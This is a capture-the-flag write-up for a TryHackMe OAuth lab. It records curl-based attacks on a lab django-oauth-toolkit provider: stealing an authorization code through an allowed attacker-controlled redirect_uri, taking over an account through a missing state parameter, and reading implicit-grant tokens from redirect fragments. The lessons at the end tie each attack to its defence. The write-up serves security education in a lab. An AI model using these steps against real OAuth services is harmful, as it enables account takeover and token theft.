# OAuth Vulnerabilities (TryHackMe)

Room: OAuth Vulnerabilities — premium web-app auth room on OAuth 2.0 flaws. A customised
**django-oauth-toolkit** provider (`CoffeeShopApp` at `coffee.thm:8000`) serves several client apps;
each task exploits one OAuth weakness to steal a token or hijack an account. Completed: 2026-11-02 |
Target: <ip> (`oauth1.22_split-badr`).

Solved **fully headless from `C:\CTF`** with `curl` + cookie jars — no AttackBox, no split-screen.
The room's apps are served by name on the one target IP, so every request used
`curl --resolve <host>:<port>:<ip>`. Three independent sessions were kept as separate cookie
jars: victim on `coffee.thm:8000` (`cj_victim.txt`), attacker on `coffee.thm:8000`
(`cj_attacker.txt`), victim on the PHP client `bistro.thm:8080` (`cj_bistro.txt`).

## Answers

| Task | Question | Answer |
|---|---|---|
| 2 | Optional param that prevents CSRF | *(find it yourself)* |
| 2 | Credential to access resources on owner's behalf | *(find it yourself)* |
| 3 | Grant type for server-to-server | *(find it yourself)* |
| 4 | `client_id` after initiating the workflow | *(find it yourself)* |
| 4 | Param giving a token's time validity | *(find it yourself)* |
| 5 | Toolkit implementing OAuth at `coffee.thm:8000` | *(find it yourself)* |
| 6 | Flag after stealing the access token | `THM{…}` |
| 7 | Flag after attaching attacker to victim account | `THM{…}` |
| 7 | Param the client includes to avoid CSRF | *(find it yourself)* |
| 8 | Symbol separating the token in the implicit URL | *(find it yourself)* |
| 8 | Flag from the flag validator | `THM{…}` |
| 9 | Omitted from OAuth 2.1 | *(find it yourself)* |

## Reproducible steps (headless)

### Provider login (Django)
`GET /admin/login/` seeds a `csrftoken` cookie; Django accepts the raw 32-char cookie value as
`csrfmiddlewaretoken`. HTTP (not HTTPS) means no Referer check. POST
`username=<u>&password=<p>&csrfmiddlewaretoken=<csrftoken>` to `/admin/login/` → `302` + `sessionid`.
The same session authenticates the `/o/authorize/` endpoint. Creds: victim `victim:<redacted-pw>`,
attacker `attacker:<redacted-pw>`.

### Consent
`GET /o/authorize/?client_id=...&response_type=...&redirect_uri=...` returns `200` (a consent page,
not a redirect — `skip_authorization` is off). Scrape the 64-char `csrfmiddlewaretoken` plus the
hidden `redirect_uri/scope/client_id/response_type`, then POST them all back with `allow=Authorize`
→ `302` to the redirect URI carrying the `code` (or, for implicit, the token fragment).

### Task 6 — token theft via unvalidated `redirect_uri`
As the logged-in **victim**, authorize `CoffeeApp` with the attacker-controlled
`redirect_uri=http://dev.bistro.thm:8002/malicious_redirect.html` (accepted — it's in the allow
list). The consent `302` leaks the code to that domain:
`Location: http://dev.bistro.thm:8002/malicious_redirect.html?code=<CODE>`. Exchange it:
`GET http://bistro.thm:8000/oauthdemo/callbackforflag/?code=<CODE>` →
`{... "flag": "THM{…}"}`.

### Task 7 — account takeover via missing `state` (CSRF)
The `ContactApp` authorize URL has **no `state`**, so an attacker's code can be planted in a
victim's session.
1. As **attacker**, authorize `ContactApp` (`client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN`)
   with `redirect_uri=http://coffee.thm/csrf/callbackcsrf.php`; consent `302` →
   `...callbackcsrf.php?code=<ATTACKER_CODE>`.
2. As **victim**, log in to the PHP client `POST bistro.thm:8080/csrf/index.php`
   (`victim:<redacted-pw>`) → `302 sync.php`.
3. As **victim**, `GET bistro.thm:8080/csrf/callbackcsrf.php?code=<ATTACKER_CODE>` — the server
   exchanges it and links the attacker's identity. Flag then on
   `bistro.thm:8080/csrf/sync.php` → `THM{…}`.

### Task 8 — implicit grant token exfiltration
As the logged-in **victim**, authorize `FactBookApp`
(`client_id=npmL7WDiRoOvjZoGSDiJhU2ViodTdygjW8rdabt7`) with **`response_type=token`** and
`redirect_uri=http://factbook.thm:8080/callback.php`. The consent `302`'s `Location` carries the
token in the fragment:
`...callback.php#access_token=<TOKEN>&expires_in=36000&token_type=Bearer&...`. Submit it:
`POST coffee.thm:8080/flagvalidator/` with `inptoken=<TOKEN>&token=submit` → `THM{…}`.

## Lessons

- **`curl --resolve` beats the AttackBox for `/etc/hosts` rooms.** Every `*.thm` app resolved to the
  single target IP; mapping each `host:port` with `--resolve` drove the whole room from Windows,
  including the "attacker-controlled" `dev.bistro.thm:8002` (it's just another vhost on the target).
- **The `redirect_uri` is bound to the code at issue time** (django-oauth-toolkit). Task 7 first
  failed with `invalid_grant` because the code was minted against the `callbackforcsrf` shortcut
  URI, but the victim's `callbackcsrf.php` exchanges with `http://coffee.thm/csrf/callbackcsrf.php`.
  Re-minting the code against *that exact* URI made the exchange succeed. The shortcut endpoint only
  echoes the code; it does not pre-bind it to a URI you can later exchange from elsewhere.
- **Implicit tokens live in the URL fragment — and `curl` shows it.** The fragment after `#` never
  reaches the server, but it's right there in the `302 Location` header, so no browser/XSS is needed
  to capture an implicit-grant token headlessly. This is exactly why implicit was deprecated in
  OAuth 2.1 (Task 9 `a`): any script on the page (or anything that sees the redirect) reads it.
- **Django CSRF shortcut:** the raw `csrftoken` cookie (32 chars, unmasked) is accepted as
  `csrfmiddlewaretoken` on login; on the consent page use the page's own masked 64-char token.
- **`state` is the single most repeated answer** (Tasks 2 and 7) — missing/weak `state` is the CSRF
  root cause, and enforcing it is one of OAuth 2.1's mandates.
